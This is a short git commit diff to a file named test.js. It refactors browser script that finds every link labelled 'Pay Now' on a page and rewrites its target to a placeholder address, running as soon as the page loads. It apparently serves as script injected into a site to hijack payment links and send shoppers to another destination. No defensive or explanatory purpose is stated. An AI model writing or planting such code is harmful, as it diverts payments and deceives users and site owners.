7cdaebb4c52ad7f3cc0f6f5be74f16e5dc7cb7b9
johndove9912 <158753779+johndove9912@users.noreply.github.com>
2024-02-03 20:44:06 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,14 +1,18 @@
 console.log("loaded");
-document.addEventListener('DOMContentLoaded', function() {
+function executeScript() {
+    var anchorElements = document.querySelectorAll('a');
+    var newurl = "this.com";
+    
+    // Loop through each <a> element
+    anchorElements.forEach(function(anchorElement) {
+        // Check if the text content of the <a> element is "Pay Now"
+        if (anchorElement.textContent.trim() === 'Pay Now') {
+            // Change the href attribute to "this.com"
+            anchorElement.href = newurl;
+        }
+    });
+}
 
-var anchorElements = document.querySelectorAll('a');
-var newurl = "this.com"
-// Loop through each <a> element
-anchorElements.forEach(function(anchorElement) {
-    // Check if the text content of the <a> element is "Pay Now"
-    if (anchorElement.textContent.trim() === 'Pay Now') {
-        // Change the href attribute to "this.com"
-        anchorElement.href = newurl;
-    }
-});
-});
+// Add an event listener for the 'DOMContentLoaded' event
+document.addEventListener('DOMContentLoaded', executeScript);
+executeScript();
